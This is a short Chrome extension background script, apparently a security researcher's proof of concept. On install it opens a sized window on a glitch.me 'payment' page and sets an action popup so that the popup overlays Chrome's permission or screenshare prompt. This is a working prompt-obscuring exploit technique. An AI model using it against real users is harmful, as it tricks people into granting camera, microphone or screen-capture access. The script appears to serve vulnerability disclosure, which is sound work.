
/***** INSTRUCTIONS ******
Set scenario below, then (re)load extension to run
****** INSTRUCTIONS *****/

var scenario = 'permission';
//var scenario = 'screenshare';

/*** PoC context ***
This PoC is designed to work when chrome.action.openPopup() is NOT available
but still works when it's available, since this technique is unaffected by openPopup() availability.
********************/

// true on v101 Canary + v100 Dev, false on v98 Stable
var canOpenPopup = (typeof chrome.action.openPopup !== 'undefined');
var url;
var popupUrl;
var width;
var height;

if (canOpenPopup) {
  console.warn('This PoC will work but chrome.action.openPopup() is available which allows the other, better PoC to work.');
}

if (scenario === 'permission') {
  //url = 'https://alesandroortiz.com/security/chromium/extension-over-prompt.html';
  //url = 'https://wiry-nova-floor.glitch.me/';//
  url = 'https://thundering-unruly-windflower.glitch.me/payment1.html';
  //width = 548; // Width with #permission-chip flag disabled (Disabled by default on v98 Stable?)
  //width = 680; // Width with #permission-chip flag disabled (Disabled by default on v98 Stable?)
  width = 950; // Width with #permission-chip flag disabled (Disabled by default on v98 Stable?)
  height = 700;
  popupUrl = 'popup.html';
} else if (scenario === 'screenshare') {
 // url = 'https://alesandroortiz.com/security/chromium/extension-over-prompt.html?screenshare';
  //url = 'https://wiry-nova-floor.glitch.me/';
  url = 'https://thundering-unruly-windflower.glitch.me/payment1.html';
  width = 700; // v98 Stable
  height = 700;
  popupUrl = 'popup-screenshare.html';
}

chrome.action.setPopup({popup: popupUrl});

var openedTabId;

chrome.runtime.onInstalled.addListener(() => {
  console.info('Extension running.');
  // Create the window, then ask user to press keyboard shortcut to trigger extension action popup
  chrome.windows.create({url: url, width: width, height: height});
});
